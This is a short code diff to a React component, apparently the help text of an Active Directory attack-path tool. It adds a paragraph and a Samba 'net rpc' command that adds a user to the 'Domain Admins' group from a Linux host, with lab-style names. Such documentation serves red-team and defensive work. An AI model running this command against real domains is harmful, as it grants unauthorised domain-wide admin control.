@@ -62,6 +62,15 @@ const Abuse = ({ sourceName, sourceType }) => {
             <pre>
                 <code>{"Get-DomainGroupMember -Identity 'Domain Admins'"}</code>
             </pre>
+                    <p>
+                        You can also abuse this without using Windows-based
+                        tooling if you are operating from a Linux host.
+                        The net from the Samba toolset will let you add a
+                        user to the vulnerable group.
+                    </p>
+            <pre>
+                <code>{"net rpc group addmem 'Domain Admins' 'harmj0y' -U 'TESTLAB\\dfm.a' -S dc.testlab.local"}</code>
+            </pre>
         </>
     );
 };
